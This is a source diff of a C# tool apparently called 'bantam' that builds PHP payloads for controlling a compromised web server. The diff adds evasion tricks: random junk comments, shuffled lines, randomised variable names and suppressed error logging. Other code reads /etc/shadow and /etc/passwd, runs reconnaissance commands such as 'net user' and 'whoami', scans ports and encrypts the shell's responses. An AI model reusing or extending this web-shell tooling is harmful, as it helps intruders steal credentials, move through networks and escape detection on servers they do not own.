@@ -23,12 +23,12 @@ namespace bantam.Classes
         /// <summary>
         /// Linux File Locations
         /// </summary>
-        public const string linuxFS_ShadowFile = "/etc/shadow";
-        public const string linuxFS_PasswdFile = "/etc/passwd";
-        public const string linuxFS_IssueFile = "/etc/issue.net";
-        public const string linuxFS_hostTargetsFile = "/etc/hosts";
-        public const string linuxFS_ProcVersion = "/proc/version";
-        public const string linuxFS_NetworkInterfaces = "/etc/network/interfaces";
+        public const string linuxFS_ShadowFile          = "/etc/shadow";
+        public const string linuxFS_PasswdFile          = "/etc/passwd";
+        public const string linuxFS_IssueFile           = "/etc/issue.net";
+        public const string linuxFS_hostTargetsFile     = "/etc/hosts";
+        public const string linuxFS_ProcVersion         = "/proc/version";
+        public const string linuxFS_NetworkInterfaces   = "/etc/network/interfaces";
 
         /// <summary>
         /// Windows File Locations
@@ -38,14 +38,14 @@ namespace bantam.Classes
         /// <summary>
         /// OS Commands
         /// </summary>
-        public const string linuxOS_PsAux = "ps aux";
-        public const string linuxOS_Ifconfig = "ifconfig";
-        public const string windowsOS_Ipconfig = "ipconfig";
-        public const string windowsOS_TaskList = "tasklist";
-        public const string windowsOS_NetUser = "net user";
-        public const string windowsOS_NetAccounts = "net accounts";
-        public const string windowsOS_Ver = "ver";
-        public const string posixOS_Whoami = "whoami";
+        public const string linuxOS_PsAux           = "ps aux";
+        public const string linuxOS_Ifconfig        = "ifconfig";
+        public const string windowsOS_Ipconfig      = "ipconfig";
+        public const string windowsOS_TaskList      = "tasklist";
+        public const string windowsOS_NetUser       = "net user";
+        public const string windowsOS_NetAccounts   = "net accounts";
+        public const string windowsOS_Ver           = "ver";
+        public const string posixOS_Whoami          = "whoami";
 
         /// <summary>
         /// 
@@ -60,7 +60,8 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// Returns a random PHP comment string of a random length with a maxlength, uses a hnnnnng ghettoish method for frequency, 25%, 50%, 75% and 100% injection rates controlable in the options UI
+        /// Returns a random PHP comment string of a random length with a maxlength, 
+        /// uses a slider in the options form to determine injection freqency based on slider value
         /// </summary>
         /// <param name="maxNum"></param>
         /// <returns></returns>
@@ -70,59 +71,41 @@ namespace bantam.Classes
                 return string.Empty;
             }
 
-            int randomIndex;
-            const int winningNumber = 2;
+            int randomNumber = Helper.RandomNumber(100);
             int maxCommentLength = Config.CommentMaxLength;
             int commentFreqency = Config.CommentFrequency;
 
-            List<int> possibleNumbers = new List<int>();
-
-            if (commentFreqency == 1) {
-                possibleNumbers.Add(1);
-                possibleNumbers.Add(1);
-                possibleNumbers.Add(winningNumber);
-                possibleNumbers.Add(1);
-
-                randomIndex = Helper.RandomNumber(4);
-            } else if (commentFreqency == 2) {
-                possibleNumbers.Add(winningNumber);
-                possibleNumbers.Add(1);
-
-                randomIndex = Helper.RandomNumber(2);
-            } else if (commentFreqency == 3) {
-                possibleNumbers.Add(1);
-                possibleNumbers.Add(winningNumber);
-                possibleNumbers.Add(winningNumber);
-                possibleNumbers.Add(winningNumber);
-
-                randomIndex = Helper.RandomNumber(4);
-            } else {
-                return string.Empty;
+            if (randomNumber <= commentFreqency) {
+                int randomLength = Helper.RandomNumber(maxCommentLength);
+                return "/*" + Helper.RandomString(randomLength, true, true) + "*/";
             }
-
-            int selectedIndex = randomIndex - 1;
-
-            if (possibleNumbers.IndexOf(selectedIndex) == -1) {
-                return string.Empty;
-            }
-
-            int selectedNumber = possibleNumbers[selectedIndex];
-
-            if (selectedNumber != winningNumber) {
-                return string.Empty;
-            }
-
-            int randomLength = Helper.RandomNumber(maxCommentLength);
-            return "/*" + Helper.RandomString(randomLength, true, true) + "*/";
+            return string.Empty;
         }
 
         /// <summary>
-        /// 
+        /// Returns PHP code that should help to disable error logging, 
+        /// shuffles the code into a random order since it does not matter
         /// </summary>
         /// <returns></returns>
         public static string DisableErrorLogging()
         {
-            return RandomPHPComment() + "@error_reporting(0); @ini_set('error_log', NULL); @ini_set('log_errors', 0);" + RandomPHPComment();
+            StringBuilder linesRandomized = new StringBuilder();
+
+            //order doesn't matter so shuffle these lines
+            List<string> shuffleableLines = new List<string> {
+                "@error_reporting(0);",
+                "@ini_set('error_log', NULL);",
+                "@ini_set('log_errors', 0);"
+            };
+
+            Helper.ShuffleList(shuffleableLines);
+
+            foreach (var line in shuffleableLines) {
+                linesRandomized.Append(RandomPHPComment());
+                linesRandomized.Append(line);
+            }
+
+            return linesRandomized.ToString();
         }
 
         /// <summary>
@@ -160,7 +143,7 @@ namespace bantam.Classes
             string padVar = RandomPHPVar();
             string blockBar = RandomPHPVar();
 
-            result = blockBar + " = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);" + RandomPHPComment()
+            result = blockBar + " = @mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);" + RandomPHPComment()
                    + padVar + " = " + blockBar + " - (strlen(" + varName + ") % " + blockBar + ");" + RandomPHPComment()
                    + varName + " .= str_repeat(chr(" + padVar + "), " + padVar + ");" + RandomPHPComment()
                    + "echo base64_encode(@mcrypt_encrypt(MCRYPT_RIJNDAEL_128, '" + encryptionKey + "', " + varName + ", MCRYPT_MODE_CBC, '" + encryptionIV + "'));";
@@ -178,19 +161,19 @@ namespace bantam.Classes
         {
             //todo make dynamic/random into config loaded once???
             string varName = "$result";
-            encryptionIV = EncryptionHelper.GetRandomEncryptionIV();
-            encryptionKey = EncryptionHelper.GetRandomEncryptionKey();
+            encryptionIV = CryptoHelper.GetRandomEncryptionIV();
+            encryptionKey = CryptoHelper.GetRandomEncryptionKey();
 
             string encryption = RandomPHPComment()
                               + varName + " = base64_encode(" + varName + ");"
                               + RandomPHPComment();
 
-            if (ResponseEncryptionMode == (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL) {
+            if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL) {
                 encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
-            } else if (ResponseEncryptionMode == (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT) {
+            } else if (ResponseEncryptionMode == (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT) {
                 encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
             } else {
-                LogHelper.AddGlobalLog("Unkown encryption type selected.", "GUI Failure", 1);
+                LogHelper.AddGlobalLog("Unkown encryption type selected.", "GUI Failure", LogHelper.LOG_LEVEL.error);
                 return string.Empty;
             }
 
@@ -221,10 +204,11 @@ namespace bantam.Classes
             string phpVersionVar = RandomPHPVar();
 
             string responseCode = string.Empty;
+
             StringBuilder linesRandomized = new StringBuilder();
             StringBuilder userLines = new StringBuilder();
 
-            //order of these lines doesn't matter so we shuffle them around
+            //order doesn't matter so shuffle these lines
             List<string> shuffleableLines = new List<string> {
                 osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",
 
@@ -233,7 +217,7 @@ namespace bantam.Classes
                        + totalfreespaceVar+ " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;"),
 
                 kernelVar       + " = @php_uname('s');",
-                phpVersionVar   + " = phpversion();",
+                phpVersionVar   + " = @phpversion();",
                 releaseVar      + " = @php_uname('r');",
                 serverIpVar     + " = $_SERVER['SERVER_ADDR'];",
                 serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
@@ -242,7 +226,8 @@ namespace bantam.Classes
             Helper.ShuffleList(shuffleableLines);
 
             foreach (var line in shuffleableLines) {
-                linesRandomized.Append(line + RandomPHPComment());
+                linesRandomized.Append(line);
+                linesRandomized.Append(RandomPHPComment());
             }
 
             if (encryptResponse) {
@@ -293,7 +278,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Puts port 1-1024 into php variable $ports
         /// </summary>
         /// <returns></returns>
         public static string PortsScannerPorts1To1024()
@@ -302,7 +287,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Puts every possicble TCP port into the php variable $ports
         /// </summary>
         /// <returns></returns>
         public static string PortScannerPortsAll()
@@ -311,7 +296,7 @@ namespace bantam.Classes
         }
 
         /// <summary>
-        /// 
+        /// Puts an array of common ports into the php variable $ports
         /// </summary>
         /// <returns></returns>
         public static string PortScannerPortsCommon()
@@ -326,36 +311,42 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string PortScanner(string host, string portsCode, bool encryptResponse)
         {
+            string connectionVar = RandomPHPVar();
+            string portVar = RandomPHPVar();
+            string errVar = RandomPHPVar();
+            string errNoVar = RandomPHPVar();
+            string hasResVar = RandomPHPVar();
+
             if (encryptResponse) {
                 return RandomPHPComment()
                      + "$result='';"
                      + "@ini_set('max_execution_time', 0);"
                      + portsCode
-                     + "foreach ($ports as $port) {"
-                        + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
-                         + "if (is_resource($conn)) { "
-                             + "$result .= $port . ' ' . getservbyport($port, 'tcp'). '" + rowSeperator + "';"
-                             + "fclose($conn);"
+                     + "foreach ($ports as " + portVar + ") {"
+                        + connectionVar + " = @fsockopen('" + host + "', " + portVar  + ", " + errNoVar + ", "+ errVar + ", 2);"
+                         + "if (is_resource(" + connectionVar  + ")) { "
+                             + "$result .= " + portVar + " . ' ' . getservbyport(" + portVar + ", 'tcp'). '" + rowSeperator + "';"
+                             + "fclose(" + connectionVar + ");"
                         + "}}"
                      + "if (empty($result)) { $result = 'None'; }";
             } else {
                 return RandomPHPComment()
-                     + "$result = 0;"
+                     + hasResVar + " = 0;"
                      + "@ini_set('max_execution_time', 0);"
                      + portsCode
-                     + "foreach ($ports as $port) {"
-                        + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
-                        + "if (is_resource($conn)) { "
-                            + "$result = 1;"
-                             + "echo $port . ' ' . getservbyport($port, 'tcp'). \"\n\";"
-                             + "fclose($conn);"
+                     + "foreach ($ports as " + portVar + ") {"
+                        + connectionVar + " = @fsockopen('" + host + "', " + portVar + ", " + errNoVar + ", " + errVar + ", 2);"
+                        + "if (is_resource(" + connectionVar  + ")) { "
+                            + hasResVar + " = 1;"
+                             + "echo " + portVar + " . ' ' . getservbyport(" + portVar + ", 'tcp'). \"\n\";"
+                             + "fclose(" + connectionVar + ");"
                         + "}}"
-                     + "if (empty($result)) { echo 'None'; }";
+                     + "if (empty(" + hasResVar + ")) { echo 'None'; }";
             }
         }
 
         /// <summary>
-        /// 
+        /// Gets the php code for creating a very basic CURL request
         /// </summary>
         /// <param name="url"></param>
         /// <returns></returns>
@@ -475,7 +466,7 @@ namespace bantam.Classes
         /// <param name="fileName"></param>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
-        public static string ReadFileFromVar(string fileName, bool encryptResponse)
+        public static string ReadFileFromVarToBase64(string fileName, bool encryptResponse)
         {
             if (encryptResponse) {
                 return RandomPHPComment()
@@ -494,7 +485,7 @@ namespace bantam.Classes
         /// <param name="fileName"></param>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
-        public static string ReadFile(string fileName, bool encryptResponse)
+        public static string ReadFileToBase64(string fileName, bool encryptResponse)
         {
             if (encryptResponse) {
                 return RandomPHPComment()
